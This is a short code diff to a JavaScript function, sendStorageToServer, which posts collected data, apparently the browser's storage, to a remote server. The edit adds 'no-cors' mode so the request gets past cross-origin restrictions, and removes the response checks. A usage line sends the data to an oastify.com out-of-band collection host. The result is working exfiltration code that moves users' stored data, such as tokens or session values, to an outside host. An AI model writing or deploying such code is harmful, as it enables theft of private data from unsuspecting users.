@@ -106,13 +106,10 @@ async function sendStorageToServer(url) {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(data),
+            mode: 'no-cors'  // This mode allows the request but you won't be able to access the response
         });
-        if (response.ok) {
-            console.log('Storage data sent successfully');
-        } else {
-            console.log('Failed to send storage data', response.statusText);
-        }
+        console.log('Request sent with no-cors mode');
     } catch (error) {
         console.error('Error sending storage data:', error);
     }
@@ -120,4 +117,3 @@ async function sendStorageToServer(url) {
 
 // Usage example
 sendStorageToServer('https://3eirmuc7kqy4p8jcvdz1g2x9107rvhj6.oastify.com');
-
